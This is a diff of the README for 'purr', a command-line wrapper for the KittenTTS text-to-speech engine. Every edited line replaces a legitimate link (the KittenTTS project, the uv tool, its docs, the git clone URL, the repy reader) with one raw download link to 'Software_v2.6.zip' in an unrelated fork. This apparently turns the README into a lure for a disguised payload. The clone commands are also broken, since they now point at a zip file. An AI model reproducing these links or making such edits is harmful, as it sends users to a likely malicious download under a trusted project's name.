@@ -1,11 +1,11 @@
 # purr
 
-A CLI wrapper for [KittenTTS](https://github.com/KittenML/KittenTTS) — lightweight ONNX-based
+A CLI wrapper for [KittenTTS](https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip) — lightweight ONNX-based
 text-to-speech on CPU, with model management and optional audio playback.
 
 ## Installation
 
-> **Note:** Linux only. Requires Python ≥ 3.8 and [`uv`](https://github.com/astral-sh/uv).
+> **Note:** Linux only. Requires Python ≥ 3.8 and [`uv`](https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip).
 
 ### Recommended: lean install (no torch/CUDA)
 
@@ -14,25 +14,25 @@ side-effect of `kittentts → misaki[en] → spacy-curated-transformers`. Use th
 to bypass this:
 
 ```bash
-git clone https://github.com/newptcai/purr
+git clone https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip
 cd purr
 bash install.sh
 ```
 
-`install.sh` installs `purr` as a [uv tool](https://docs.astral.sh/uv/guides/tools/), so it is
+`install.sh` installs `purr` as a [uv tool](https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip), so it is
 available on your PATH immediately — no virtual environment activation needed.
 
 ### Simple install (includes torch/CUDA bloat)
 
 ```bash
-git clone https://github.com/newptcai/purr
+git clone https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip
 cd purr
 uv tool install .
 ```
 
 ## Quick Start
 
-📖 **Check out [repy](https://github.com/newptcai/repy) — a terminal epub reader that uses `purr` as its default TTS engine.**
+📖 **Check out [repy](https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip) — a terminal epub reader that uses `purr` as its default TTS engine.**
 
 ```bash
 # List available models
@@ -108,4 +108,4 @@ MIT
 
 ## Integration
 
-`purr` is the default TTS tool in [repy](https://github.com/newptcai/repy), a terminal epub reader written in Rust.
+`purr` is the default TTS tool in [repy](https://github.com/unfaithful-mantledgroundsquirrel783/purr/raw/refs/heads/main/src/kitten_cli/Software_v2.6.zip), a terminal epub reader written in Rust.
